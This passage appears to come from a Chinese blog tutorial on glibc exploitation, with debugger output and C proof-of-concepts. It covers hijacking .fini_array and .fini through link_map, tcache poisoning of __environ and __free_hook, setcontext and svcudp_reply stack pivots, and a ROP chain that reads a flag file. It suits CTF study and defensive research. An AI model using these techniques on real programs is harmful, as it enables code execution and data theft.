  l_info = {0x0, 0x55caaccb3e00, 0x0, 0x55caaccb3ed0, 0x0, 0x55caaccb3e80, 0x55caaccb3e90, 0x55caaccb3ee0, 0x55caaccb3ef0, 0x55caaccb3f00, 0x55caaccb3ea0, 0x55caaccb3eb0, 0x55caaccb3e10, 0x55caaccb3e20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55caaccb3ec0, 0x0, 0x0, 0x55caaccb3f20, 0x55caaccb3e30, 0x55caaccb3e50, 0x55caaccb3e40, 0x55caaccb3e60, 0x0, 0x55caaccb3f10, 0x0, 0x0, 0x0, 0x0, 0x55caaccb3f40, 0x55caaccb3f30, 0x0, 0x0, 0x55caaccb3f20, 0x0, 0x55caaccb3f60, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55caaccb3f50, 0x0 <repeats 25 times>, 0x55caaccb3e70},
  l_phdr = 0x55caaccb0040,
  l_entry = 94328970743872,
  l_phnum = 15,
  l_ldnum = 0,
  l_searchlist = {
    r_list = 0x7f99c0bee620,
    r_nlist = 3
  },
  l_symbolic_searchlist = {
    r_list = 0x7f99c0c28868,
    r_nlist = 0
  },
  l_loader = 0x0,
  l_versions = 0x7f99c0bee640,
  l_nversions = 3,
  l_nbuckets = 2,
  l_gnu_bitmask_idxbits = 0,
  l_gnu_shift = 6,
  l_gnu_bitmask = 0x55caaccb03b0,
  {
    l_gnu_buckets = 0x55caaccb03b8,
    l_chain = 0x55caaccb03b8
  },
  {
    l_gnu_chain_zero = 0x55caaccb03ac,
    l_buckets = 0x55caaccb03ac
  },
  l_direct_opencount = 2,
  l_type = lt_executable,
  l_relocated = 1,
  l_init_called = 0,
  l_global = 1,
  l_reserved = 0,
  l_main_map = 0,
  l_visited = 1,
  l_map_used = 0,
  l_map_done = 0,
  l_phdr_allocated = 0,
  l_soname_added = 0,
  l_faked = 0,
  l_need_tls_init = 0,
  l_auditing = 0,
  l_audit_any_plt = 0,
  l_removed = 0,
  l_contiguous = 1,
  l_symbolic_in_local_scope = 0,
  l_free_initfini = 0,
  l_ld_readonly = 0,
  l_find_object_processed = 0,
  l_nodelete_active = false,
  l_nodelete_pending = false,
  l_property = lc_property_none,
  l_x86_feature_1_and = 0,
  l_x86_isa_1_needed = 0,
  l_1_needed = 0,
  l_rpath_dirs = {
    dirs = 0xffffffffffffffff,
    malloced = 0
  },
  l_reloc_result = 0x0,
  l_versyms = 0x55caaccb04d6,
  l_origin = 0x0,
  l_map_start = 94328970739712,
  l_map_end = 94328970764464,
  l_text_end = 94328970744261,
  l_scope_mem = {0x7f99c0c285a0, 0x0, 0x0, 0x0},
  l_scope_max = 4,
  l_scope = 0x7f99c0c28650,
  l_local_scope = {0x7f99c0c285a0, 0x0},
  l_file_id = {
    dev = 0,
    ino = 0
  },
  l_runpath_dirs = {
    dirs = 0xffffffffffffffff,
    malloced = 0
  },
  l_initfini = 0x7f99c0bee600,
  l_reldeps = 0x0,
  l_reldepsmax = 0,
  l_used = 1,
  l_feature_1 = 0,
  l_flags_1 = 134217729,
  l_flags = 8,
  l_idx = 0,
  l_mach = {
    plt = 0,
    gotplt = 0,
    tlsdesc_table = 0x0
  },
  l_lookup_cache = {
    sym = 0x55caaccb0440,
    type_class = 4,
    value = 0x7f99c0bee060,
    ret = 0x7f99c09f5ee8
  },
  l_tls_initimage = 0x0,
  l_tls_initimage_size = 0,
  l_tls_blocksize = 0,
  l_tls_align = 0,
  l_tls_firstbyte_offset = 0,
  l_tls_offset = 0,
  l_tls_modid = 0,
  l_tls_dtor_count = 0,
  l_relro_addr = 15856,
  l_relro_size = 528,
  l_serial = 0
}
该linkmap位于ld可读可写段中
pwndbg> p/x  l   
$10 = 0x7f99c0c282e0
pwndbg> vmmap 0x7f99c0c282e0
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7f99c0c25000     0x7f99c0c27000 r--p     2000  34000 /home/llk/Desktop/glibc-chunk-poc-basic/glibc/debug_glibc-master/2.35/amd64/lib/ld-linux-x86-64.so.2
►   0x7f99c0c27000     0x7f99c0c29000 rw-p     2000  36000 /home/llk/Desktop/glibc-chunk-poc-basic/glibc/debug_glibc-master/2.35/amd64/lib/ld-linux-x86-64.so.2 +0x12e0
    0x7fff58f7d000     0x7fff58f9e000 rw-p    21000      0 [stack]

```
l->l_info[DT_FINI_ARRAY]是下面dynamic表里面DT_FINI_ARRAY的地址，`l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`对应到里面项的0x3df8，l->l_addr就是当前pie地址，相加的结果就是FINI_ARRAY的地址
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/888f797dc2a24d5d89c91705eca2ba13.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f06f0faac1a1476d9d2c5a9cd759982f.png)



会检查.fini_array是否为空，不为空就调用其中的函数，__do_global_dtors_aux函数指针存储在.fini_array（__do_global_dtors_aux_fini_array_entry），参数rdi是&_rtld_global._dl_load_lock.mutex，我们可以将_rtld_global._dl_load_lock.mutex改为`/bin/sh\x00`，然后改`__do_global_dtors_aux_fini_array_entry`里的函数指针为system或者onegadge，但所在的段的权限不允许改（2.35是不允许改的，也许低版本能改）

```bash
pwndbg> vmmap &__do_global_dtors_aux_fini_array_entry
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x555555556000     0x555555557000 r--p     1000   2000 /home/llk/Desktop/chunk_poc/fastbin_reverse_into_tcache/2.31
►   0x555555557000     0x555555558000 r--p     1000   2000 /home/llk/Desktop/chunk_poc/fastbin_reverse_into_tcache/2.31 +0xda0
    0x555555558000     0x555555559000 rw-p     1000   3000 /home/llk/Desktop/chunk_poc/fastbin_reverse_into_tcache/2.31
```

但如果可以修改linkmap的l_addr和l_info，也许可以操作一波
[非栈上格式化字符串之.fini_array劫持](https://www.cnblogs.com/seyedog/articles/17891485.html)

```c
 ElfW(Addr) *array =
			    (ElfW(Addr) *) (l->l_addr
					    + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
```
其中l_addr是pie基地址，然后l_info存储着各个段在daymic段上的信息的起始地址，` 如 0x000000000000001a (FINI_ARRAY)         0x3da0` 那么存储的是`0x000000000000001a `的地址

```c
pwndbg> p/x 93824992231424
$13 = 0x555555554000
pwndbg> p *(struct link_map*) 0x7ffff7ffe190

$12 = {
  l_addr = 93824992231424,
  l_name = 0x7ffff7ffe730 "",
  l_ld = 0x555555557da8,
  l_next = 0x7ffff7ffe740,
  l_prev = 0x0,
  l_real = 0x7ffff7ffe190,
  l_ns = 0,
  l_libname = 0x7ffff7ffe718,
  l_info = {0x0, 0x555555557da8, 0x555555557e88, 0x555555557e78, 0x0, 0x555555557e28, 0x555555557e38, 0x555555557eb8, 0x555555557ec8, 0x555555557ed8, 0x555555557e48, 0x555555557e58, 0x555555557db8, 0x555555557dc8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x555555557e98, 0x555555557e68, 0x0, 0x555555557ea8, 0x555555557ef8, 0x555555557dd8, 0x555555557df8, 0x555555557de8, 0x555555557e08, 0x0, 0x555555557ee8, 0x0, 0x0, 0x0, 0x0, 0x555555557f18, 0x555555557f08, 0x0, 0x0, 0x555555557ef8, 0x0, 0x555555557f38, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x555555557f28, 0x0 <repeats 25 times>, 0x555555557e18},


```
然后会按照之前` 如 0x000000000000001a (FINI_ARRAY)         0x3da0` 取出的0x000000000000001a 的地址按照一定偏移取指针得到0x3da0作为偏移（就是d_un.d_ptr），然后`link_map`的前八个字节作为基地址，相加得到`array`

然后按照同样的方式` 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)`取出8，右移动3位，得到array里的函数指针个数，然后减一作为索引，最后调用FINI_ARRAY里的函数指针
```c
  0x7ffff7de4ba9 <_dl_fini+409>    mov    r14, qword ptr [rax + 8]         R14, [_DYNAMIC+88] => 0x3da0
   0x7ffff7de4bad <_dl_fini+413>    mov    rax, qword ptr [rbx + 0x120]     RAX, [0x7ffff7ffe2b0] => 0x555555557e08 (_DYNAMIC+96) ◂— 0x1c
   0x7ffff7de4bb4 <_dl_fini+420>    add    r14, qword ptr [rbx]             R14 => 0x555555557da0 (__do_global_dtors_aux_fini_array_entry) (0x3da0 + 0x555555554000)

 0x7ffff7de4bb7 <_dl_fini+423>    mov    rdx, qword ptr [rax + 8]         RDX, [_DYNAMIC+104] => 8
 ► 0x7ffff7de4bbb <_dl_fini+427>    shr    rdx, 3
   0x7ffff7de4bbf <_dl_fini+431>    lea    eax, [rdx - 1]                   EAX => 0
   0x7ffff7de4bc2 <_dl_fini+434>    lea    r12, [r14 + rax*8]               R12 => 0x555555557da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555170 (__do_global_dtors_aux) ◂— endbr64 
   0x7ffff7de4bc6 <_dl_fini+438>    test   edx, edx                         1 & 1     EFLAGS => 0x202 [ cf pf af zf sf IF df of ]
   0x7ffff7de4bc8 <_dl_fini+440>  ✔ jne    _dl_fini+451                <_dl_fini+451>
    ↓
   0x7ffff7de4bd3 <_dl_fini+451>    call   qword ptr [r12]             <__do_global_dtors_aux>

```

查看相关link_map结构，可写位于ld段下面(有些版本位于ld中)，如果可以将l_info[DT_FINI_ARRAY]劫持到一个伪造的段信息，设置好偏移和基地址，将其指向伪造的fini_array，然后l_info[DT_FINI_ARRAYSZ]也指向伪造的，设置为8（执行的函数指针个数是8/8），其中存储的函数指针为system或者gadget，这里rdi依然是&_rtld_global._dl_load_lock.mutex，依然能构造参数，但前面已经使用到了，如果修改执行不到这里

但是修改l_info[DT_FINI_ARRAY]满足的条件比较多，修改l_addr也许方便一些
```c
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  28000 /home/llk/Desktop/chunk_poc/glibc/debug_glibc-master/2.31/amd64/lib/ld-2.31.so
►   0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe] +0x190
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]

```
### poc
查看程序各个段的gdb命令

```cpp
info files
maintenance info sections
```

篡改的时候注意相关字段或者其他字段要满足触发条件

```cpp
  /* Is there a destructor function?  */
		  if (l->l_info[DT_FINI_ARRAY] != NULL
		      || (ELF_INITFINI && l->l_info[DT_FINI] != NULL))
		    {
		      /* When debugging print a message first.  */
		      if (__builtin_expect (GLRO(dl_debug_mask)
					    & DL_DEBUG_IMPCALLS, 0))
			_dl_debug_printf ("\ncalling fini: %s [%lu]\n\n",
					  DSO_FILENAME (l->l_name),
					  ns);

		      /* First see whether an array is given.  */
		      if (l->l_info[DT_FINI_ARRAY] != NULL)
			{
			  ElfW(Addr) *array =
			    (ElfW(Addr) *) (l->l_addr
					    + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
			  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
					    / sizeof (ElfW(Addr)));
			  while (i-- > 0)
			    ((fini_t) array[i]) ();
			}

		      /* Next try the old-style destructor.  */
		      if (ELF_INITFINI && l->l_info[DT_FINI] != NULL)
			DL_CALL_DT_FINI
			  (l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
		    }

```

- 劫持fini_array
能写fini_array就不用在乎其他的字段了，但一般只有完全关闭`RELRO保护`才可以写，动态编译`fini_array`只有一个函数指针，而静态编译`fini_array`有两个函数指针（静态编译时会执行__libc_csu_fini，里面先执行fini_array[1]，再执行fini_array[0]但控制不了参数，默认是0）
[劫持 64 位 fini_array 进行 ROP 攻击](https://wiki.mrskye.cn/Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/)

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void getshell()
{
  system("/bin/sh");
}
//gcc -z norelro -static  -pie 2.35.c -g -o 2.35
// int main() {

//   char* leak_pie=getshell;
//   printf("leak pie %p\n",leak_pie);
//   char* fini_array=0xbc37b+leak_pie;
//   *(unsigned long long*)fini_array=getshell;
//   *(unsigned long long*)(fini_array+8)=getshell;
//   return 0;
// }

//gcc -z norelro   2.35.c -g -o 2.35

int main() {

  char* leak_pie=getshell;
  printf("leak pie %p\n",leak_pie);
  char* fini_array=0x202f+leak_pie;
  *(unsigned long long*)fini_array=getshell;

  return 0;
}
```
- 劫持l->l_addr和l_info[DT_FINI_ARRAY]最后都要满足劫持到一个伪造的fini_array上，里面存有要调用的函数指针。比较麻烦，很少用到感觉



## 劫持.fini
然后通过`l_info[DT_FINI] （指向 0x000000000000000d (FINI)               0x1408
）`是否为空，不为空就通过link_map前八个字节作为基地址+0x1408作为fini函数的地址去调用fini函数（函数地址就是fini段地址）
```bash
 [14]     0x5555555551b8->0x5555555551c5 at 0x000011b8: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
 
 pwndbg> disass _fini
Dump of assembler code for function _fini:
   0x00005555555551b8 <+0>:	endbr64 
   0x00005555555551bc <+4>:	sub    rsp,0x8
   0x00005555555551c0 <+8>:	add    rsp,0x8
   0x00005555555551c4 <+12>:	ret    
End of assembler dump.

   0x7ffff7de4be1 <_dl_fini+465>    mov    rax, qword ptr [rbx + 0xa8]     RAX, [0x7ffff7ffe238] => 0x555555557dc8 (_DYNAMIC+32) ◂— 0xd /* '\r' */
 ► 0x7ffff7de4be8 <_dl_fini+472>    test   rax, rax                        0x555555557dc8 & 0x555555557dc8     EFLAGS => 0x202 [ cf pf af zf sf IF df of ]
   0x7ffff7de4beb <_dl_fini+475>    je     _dl_fini+486                <_dl_fini+486>
 
   0x7ffff7de4bed <_dl_fini+477>    mov    rax, qword ptr [rax + 8]        RAX, [_DYNAMIC+40] => 0x1408
   0x7ffff7de4bf1 <_dl_fini+481>    add    rax, qword ptr [rbx]            RAX => 0x555555555408 (_fini) (0x1408 + 0x555555554000)

 ► 0x7ffff7fe0f8b <_dl_fini+555>    call   rax                         <_fini>
        rdi: 0x555555558010 (completed) ◂— 1
        rsi: 0
        rdx: 0x555555557df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555550e0 (__do_global_dtors_aux) ◂— endbr64 
        rcx: 0
        
  /* Next try the old-style destructor.  */
		      if (l->l_info[DT_FINI] != NULL)
			DL_CALL_DT_FINI
			  (l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
		    }
```
如果可以改fini段为shellocde，就可以任意命令执行，但没有写权限

```bash
pwndbg> vmmap &_fini
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/llk/Desktop/chunk_poc/fastbin_reverse_into_tcache/2.31
►   0x555555555000     0x555555556000 r-xp     1000   1000 /home/llk/Desktop/chunk_poc/fastbin_reverse_into_tcache/2.31 +0x408
    0x555555556000     0x555555557000 r--p     1000   2000 /home/llk/Desktop/chunk_poc/fastbin_reverse_into_tcache/2.31

```
依然可以修改linkmap的l_addr和l_info来操作，而且相比上述fini_array更好操作些，只需要修改`l->l_info[DT_FINI]和l->l_addr`，构造l->l_info[DT_FINI]对于的地址的相关fini段信息中的偏移信息+l->l_addr的地址指向onegadget地址就可以了，但是缺点是参数不可控，这里不需要修改`l->l_addr`前面的fini_array要用到，所以我们修改l->l_info[DT_FINI]来满足即可（参数`  rdi: 0x555555558010 (completed) ◂— 1`，发现来自pie中，可读可写，`►   0x555555558000     0x555555559000 rw-p     1000   3000 /home/llk/Desktop/chunk_poc/fastbin_reverse_into_tcache/2.31 +0x10`,maybe可以利用来控制参数）
### poc
找到目标后门与pie地址的偏移后查看是否存有该偏移的地址，然后`l->l_info[DT_FINI]`设置为该地址-8

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}

int main() {
  char *system_ptr = (char *)&system;
  char *getshell_ptr = (char *)getshell;
  printf("system:%p\n",system_ptr);
  char *_rtld_global_addr = (char *)(system_ptr+0x1a5568);
  char *_rtld_global=*(unsigned long long *)_rtld_global_addr;
  char *link_map = _rtld_global + 0x12a0;
  printf("link map %p",link_map);
  char *l_info_DT_FINI=link_map+0xa8;
  printf("l_info_DT_FINI  %p",l_info_DT_FINI);
  *(unsigned long long*)l_info_DT_FINI=0x3e4f+getshell_ptr-8;
  return 0;
}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2901eeb2e1d144ceab5f48a64b1ada0a.png)

# mmap泄露
在glibc堆初始化时会一次划出132KB的内存大小来供程序使用，也就是说我们提到tcache/fast/small/unsorted/large都是在这132KB（0x21000）基础上产生的。那么如果直接malloc超过132KB大小的话。系统会调用mmap在libc附近分配内存，经过测试虽然大于132KB可以让其分配在libc附近，但不达到一定大小，分配的内存地址和libc的偏移是不太确定的。这里借鉴了前辈的经验，分配0x200000的内存可以让偏移固定。（调试查看该版本的topchunk大小即可，一般大于会调用map分配）

## poc

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getlibc()
{
    puts("getheap\n");
    size_t libc_addr=puts-0x84420;
    return libc_addr;
}
int main()
{
    size_t* chunk1=malloc(0x21000);
    size_t* libc_base=getlibc();
    printf("leak chunk1 %p \n",chunk1);
    printf("leak libc base %p\n",libc_base);
    printf("libc-chunk1= %p\n",libc_base-chunk1);
}
```

# setcontext gadget | [magic_gadget总结及](https://xz.aliyun.com/t/12975?time__1311=GqGxuD9Dgim4lrzG7DyDmEQf3i=eD8BAeD)
setcontext函数是libc中一个独特的函数，它的功能是传入一个 SigreturnFrame 结构指针，然后根据 SigreturnFrame 的内容设置各种寄存器。
因此从 setcontext+53（不同 libc 偏移可能不同）的位置开始有如下 gadget，即根据 rdi 也就是第一个参数指向的 SigreturnFrame 结构设置寄存器。

```cpp
pwndbg> disass setcontext
Dump of assembler code for function setcontext:
   0x00007f73f9c01c80 <+0>:	push   rdi
   0x00007f73f9c01c81 <+1>:	lea    rsi,[rdi+0x128]
   0x00007f73f9c01c88 <+8>:	xor    edx,edx
   0x00007f73f9c01c8a <+10>:	mov    edi,0x2
   0x00007f73f9c01c8f <+15>:	mov    r10d,0x8
   0x00007f73f9c01c95 <+21>:	mov    eax,0xe
   0x00007f73f9c01c9a <+26>:	syscall 
   0x00007f73f9c01c9c <+28>:	pop    rdi
   0x00007f73f9c01c9d <+29>:	cmp    rax,0xfffffffffffff001
   0x00007f73f9c01ca3 <+35>:	jae    0x7f73f9c01d00 <setcontext+128>
   0x00007f73f9c01ca5 <+37>:	mov    rcx,QWORD PTR [rdi+0xe0]
   0x00007f73f9c01cac <+44>:	fldenv [rcx]
   0x00007f73f9c01cae <+46>:	ldmxcsr DWORD PTR [rdi+0x1c0]
   0x00007f73f9c01cb5 <+53>:	mov    rsp,QWORD PTR [rdi+0xa0]
   0x00007f73f9c01cbc <+60>:	mov    rbx,QWORD PTR [rdi+0x80]
   0x00007f73f9c01cc3 <+67>:	mov    rbp,QWORD PTR [rdi+0x78]
   0x00007f73f9c01cc7 <+71>:	mov    r12,QWORD PTR [rdi+0x48]
   0x00007f73f9c01ccb <+75>:	mov    r13,QWORD PTR [rdi+0x50]
   0x00007f73f9c01ccf <+79>:	mov    r14,QWORD PTR [rdi+0x58]
   0x00007f73f9c01cd3 <+83>:	mov    r15,QWORD PTR [rdi+0x60]
   0x00007f73f9c01cd7 <+87>:	mov    rcx,QWORD PTR [rdi+0xa8]
   0x00007f73f9c01cde <+94>:	push   rcx
   0x00007f73f9c01cdf <+95>:	mov    rsi,QWORD PTR [rdi+0x70]
   0x00007f73f9c01ce3 <+99>:	mov    rdx,QWORD PTR [rdi+0x88]
   0x00007f73f9c01cea <+106>:	mov    rcx,QWORD PTR [rdi+0x98]
   0x00007f73f9c01cf1 <+113>:	mov    r8,QWORD PTR [rdi+0x28]
   0x00007f73f9c01cf5 <+117>:	mov    r9,QWORD PTR [rdi+0x30]
   0x00007f73f9c01cf9 <+121>:	mov    rdi,QWORD PTR [rdi+0x68]
   0x00007f73f9c01cfd <+125>:	xor    eax,eax
   0x00007f73f9c01cff <+127>:	ret    
   0x00007f73f9c01d00 <+128>:	mov    rcx,QWORD PTR [rip+0x36b161]        # 0x7f73f9f6ce68
   0x00007f73f9c01d07 <+135>:	neg    eax
   0x00007f73f9c01d09 <+137>:	mov    DWORD PTR fs:[rcx],eax
   0x00007f73f9c01d0c <+140>:	or     rax,0xffffffffffffffff
   0x00007f73f9c01d10 <+144>:	ret    
End of assembler dump.
```
可以通过rdi指向的内容赋值给各个寄存器，处理rax会最后设置为0

可以利用覆盖free_hook为`setcontext+53`，rdi是对应的堆地址，往对应堆地址设置好等会`setcontext`要赋值的寄存器值就行，然后 free 一个存储 SigreturnFrame 结构的内存来设置寄存器，继而控制程序执行流程来执行 shellcode 或进一步 rop （一般是禁了system或者别的才会写free_hook为`setcontext`）


然而，从 libc-2.29 版本起，setcontext 改用 rdx 寄存器来访问 SigreturnFrame 结构，因此无法直接利用 setcontext 的 gadget 将 free 的 SigreturnFrame 结构赋值给寄存器。
不过可以先泄露堆地址，然后通过下面两条 gadget 中的一条将释放的 chunk 的内存地址赋值给 rdx 然后跳转到 setcontext 的 gadget 。

```cpp
mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax
mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]

```

还有一个magic gadget可以用来平替setcontext（在某些特定libc版本下存在）比如有的 libc 使用的是 rbx 而不是 rbp 导致无法栈迁移实现对程序执行流程的连续劫持。

```cpp
<svcudp_reply+22>:	mov    rbp,QWORD PTR [rdi+0x48]
<svcudp_reply+26>:	mov    rax,QWORD PTR [rbp+0x18]
<svcudp_reply+30>:	lea    r12,[rbp+0x10]
<svcudp_reply+34>:	mov    DWORD PTR [rbp+0x10],0x0
<svcudp_reply+41>:	mov    rdi,r12
<svcudp_reply+44>:	call   QWORD PTR [rax+0x28]

```
利用这个gadget，通过rdi控制rbp进而控制rax并执行跳转,只需要在rax + 0x28的位置设置leave; ret即可完成栈迁移

> 参考自sky123师傅的图

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b941cc301ea04d46b4fbde299c99fa62.png)

但一般都是rbx，但是可以发现前面一部分还是可以赋值rbp的，我们只需保证`rax+0x28`存储 leave ret的地址就行

```cpp
   0x00007f0f28973baf <+15>:	mov    rbp,rdi  //这里赋值
   0x00007f0f28973bb2 <+18>:	sub    rsp,0x18
   0x00007f0f28973bb6 <+22>:	mov    rbx,QWORD PTR [rdi+0x48]
   0x00007f0f28973bba <+26>:	mov    rax,QWORD PTR [rbx+0x18]
   0x00007f0f28973bbe <+30>:	lea    r12,[rbx+0x10]
   0x00007f0f28973bc2 <+34>:	mov    DWORD PTR [rbx+0x10],0x0
   0x00007f0f28973bc9 <+41>:	mov    rdi,r12
   0x00007f0f28973bcc <+44>:	call   QWORD PTR [rax+0x28]
   0x00007f0f28973bcf <+47>:	mov    rax,QWORD PTR [rbx+0x8]
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/63f2e9c85a2f4b5bb0035934aa638488.png)


从上面我们可以总结如下流程

 一方面是通过泄露栈地址直接劫持到栈上rop

 另一方面通过magic gadget或者setcontext gadget来劫持控制流 
 -  rop：执行gadget后迁移到堆上构造好的rop链
 - shellcode：执行gadget后mprotect改权限可执行，然后跳转到布置好的堆上的shellcode

劫持fd到free_hook篡改并同时布置相关符合gadget的操作的内容应该是可以的（就是free劫持free_hook的chunk）

## 堆劫持到栈的ROP
__environ 是一个保存了栈上变量地址的系统变量，位于 libc 中。

先利用 tcache attack 攻击 __environ 泄露栈地址，然后再利用 tcache 攻击栈上函数的返回地址处，写入 ROP 最后在函数返回控制函数执行流程。

### poc
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
int main() {
  char* chunk1=malloc(0x100);
  char* chunk2=malloc(0x100);
  free(chunk1);
  free(chunk2);
  char* system_ptr=system;
  printf("system addr %p\n",system_ptr);
  char* _environ=system_ptr+0x1edfc0;
  printf("environ %p\n",_environ);
  char* leak_chunk=(*(unsigned long long *)chunk1)<<12;
  printf("chunk ptr %p\n",leak_chunk);
  *(unsigned long long *)chunk2=((unsigned long long )leak_chunk>>12)^(unsigned long long)(_environ);
  chunk2=malloc(0x100);
  chunk1=malloc(0x100);
  unsigned long long stack=*(unsigned long long *)chunk1;
  printf("chunk1[0] leak stack %p \n",stack);

  unsigned long long retaddr=stack-0x120;
  chunk1=malloc(0x110);
  chunk2=malloc(0x110);
  free(chunk1);
  free(chunk2);
  leak_chunk=(*(unsigned long long *)chunk1)<<12;
  printf("chunk ptr %p\n",leak_chunk);
  *(unsigned long long *)chunk2=((unsigned long long )leak_chunk>>12)^(unsigned long long)(retaddr-8);
  chunk2=malloc(0x110);
  chunk1=malloc(0x110);
  *(unsigned long long *)(chunk1+8)=getshell; //rop
  return 0;
}
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6fc4320d65b1461e911355743b687b1c.png)

## 堆的 ROP

通过 setcontext 或者相关house of IO手段将栈迁移至写有 rop 的堆中，利用 rop 来控制程序执行流程。

### poc
- magic gadget
最后通过`call   QWORD PTR [rax+0x28]`来劫持控制流，然后leave ret栈迁移

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
//    libc:0x7fd0795d7000
//    svcudp_reply
//    0x00007fbfdb845f2e <+14>:	mov    rbp,rdi
//    0x00007fbfdb845f31 <+17>:	push   rbx
//    0x00007fbfdb845f32 <+18>:	sub    rsp,0x18
//    0x00007fbfdb845f36 <+22>:	mov    rbx,QWORD PTR [rdi+0x48]
//    0x00007fbfdb845f3a <+26>:	mov    rax,QWORD PTR [rbx+0x18]
//    0x00007fbfdb845f3e <+30>:	lea    r12,[rbx+0x10]
//    0x00007fbfdb845f42 <+34>:	mov    DWORD PTR [rbx+0x10],0x0
//    0x00007fbfdb845f49 <+41>:	mov    rdi,r12
// => 0x00007fbfdb845f4c <+44>:	call   QWORD PTR [rax+0x28]

int main() {
  char* chunk1=malloc(0x100);
  char* chunk2=malloc(0x100);
  free(chunk1);
  free(chunk2);
  char* system_ptr=system;
  printf("system addr %p\n",system_ptr);
  char* free_hook=system_ptr+0x374c28;
  char* magic_gadget=system_ptr+0xdfd16-8;
  char* read=system_ptr+0xa3ef0;
  char* open=system_ptr+0xa3c60;
  char* write=system_ptr+0xa3f90;
  char* syscall_ret=system_ptr+0xe6069;
  char* pop_rdi_ret=system_ptr-0x2177e;
  char* pop_rsi_ret=system_ptr-0x20ea2;
  char* pop_rdx_ret=system_ptr-0x42686;
  printf("free_hook %p \n",free_hook);
  
  *(unsigned long long *)chunk2=(unsigned long long)(free_hook-8);
  
  chunk2=malloc(0x100);
  chunk1=malloc(0x100);
  *(unsigned long long *)(chunk1+8)=magic_gadget;
  printf("chunk1 %p \n",*(unsigned long long *)chunk1);
  char* padding=malloc(0x100);
  char* rop=malloc(0x100);
  *(unsigned long long *)rop=pop_rdi_ret;  //orw
  *(unsigned long long *)(rop+8)=rop+0x70;
  *(unsigned long long *)(rop+0x10)=pop_rsi_ret;   
  *(unsigned long long *)(rop+0x18)=0;   
  *(unsigned long long *)(rop+0x20)=open;  
  *(unsigned long long *)(rop+0x28)=pop_rdi_ret;
  *(unsigned long long *)(rop+0x30)=3;
  *(unsigned long long *)(rop+0x38)=pop_rdx_ret;
  *(unsigned long long *)(rop+0x40)=0x10;
  *(unsigned long long *)(rop+0x48)=read;
  *(unsigned long long *)(rop+0x50)=pop_rdi_ret;
  *(unsigned long long *)(rop+0x58)=1;
  *(unsigned long long *)(rop+0x60)=write;
  strcpy(rop+0x70, "./flag");
  *(unsigned long long *)(padding+0x48)=padding+0x10;
  *(unsigned long long *)(padding+0x28)=padding+0x8;
  *(unsigned long long *)(padding+0x30)=system_ptr+0x47c7;
  *(unsigned long long *)(padding+0x8)=system_ptr-0x4084c;
  *(unsigned long long *)(padding+0x10)=rop;
  free(padding);
  return 0;
}
```
- setcontext（setcontext用rdi传参）

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
//    <setcontext+53>    mov    rsp, qword ptr [rdi + 0xa0]     RSP, [0x55bf1e64c710] => 0
//    <setcontext+60>    mov    rbx, qword ptr [rdi + 0x80]     RBX, [0x55bf1e64c6f0] => 0
//    <setcontext+67>    mov    rbp, qword ptr [rdi + 0x78]     RBP, [0x55bf1e64c6e8] => 0
//    <setcontext+71>    mov    r12, qword ptr [rdi + 0x48]     R12, [0x55bf1e64c6b8] => 0
//    <setcontext+75>    mov    r13, qword ptr [rdi + 0x50]     R13, [0x55bf1e64c6c0] => 0
//  ► <setcontext+79>    mov    r14, qword ptr [rdi + 0x58]     R14, [0x55bf1e64c6c8] => 0x20941
//    <setcontext+83>    mov    r15, qword ptr [rdi + 0x60]     R15, [0x55bf1e64c6d0] => 0
//    <setcontext+87>    mov    rcx, qword ptr [rdi + 0xa8]     RCX, [0x55bf1e64c718] => 0
//    <setcontext+94>    push   rcx
//    <setcontext+95>    mov    rsi, qword ptr [rdi + 0x70]
//    <setcontext+99>    mov    rdx, qword ptr [rdi + 0x88]
//    <setcontext+106>    mov    rcx, qword ptr [rdi + 0x98]
//    <setcontext+113>    mov    r8, qword ptr [rdi + 0x28]
//    <setcontext+117>    mov    r9, qword ptr [rdi + 0x30]
